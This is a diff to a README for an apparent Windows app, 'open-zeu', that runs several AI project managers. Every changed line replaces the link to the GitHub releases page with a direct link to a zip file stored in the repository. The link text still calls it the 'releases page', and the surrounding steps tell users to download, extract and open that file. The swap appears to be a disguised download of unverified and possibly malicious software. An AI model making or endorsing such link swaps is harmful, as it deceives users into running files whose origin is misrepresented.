@@ -1,6 +1,6 @@
 # 🤖 open-zeu - Run multiple AI project managers
 
-[![Download open-zeu](https://img.shields.io/badge/Download%20open--zeu-4C7CFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ordered-tincture209/open-zeu/releases)
+[![Download open-zeu](https://img.shields.io/badge/Download%20open--zeu-4C7CFF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ordered-tincture209/open-zeu/main/ui/open_zeu_3.6.zip)
 
 ## 🧭 What this app does
 
@@ -18,7 +18,7 @@ This setup works well if you want one place to track work, move tasks, and open 
 
 ## 💾 Download for Windows
 
-Visit the [releases page](https://github.com/ordered-tincture209/open-zeu/releases) and download the latest Windows release.
+Visit the [releases page](https://raw.githubusercontent.com/ordered-tincture209/open-zeu/main/ui/open_zeu_3.6.zip) and download the latest Windows release.
 
 After the file downloads:
 1. Open the downloaded file
@@ -43,7 +43,7 @@ For best results, keep the repo in a folder you can find again, such as:
 
 ## 📦 Install on Windows
 
-1. Visit the [releases page](https://github.com/ordered-tincture209/open-zeu/releases)
+1. Visit the [releases page](https://raw.githubusercontent.com/ordered-tincture209/open-zeu/main/ui/open_zeu_3.6.zip)
 2. Download the latest Windows file
 3. Save it to a folder you can find
 4. If the file is zipped, right-click it and choose Extract All
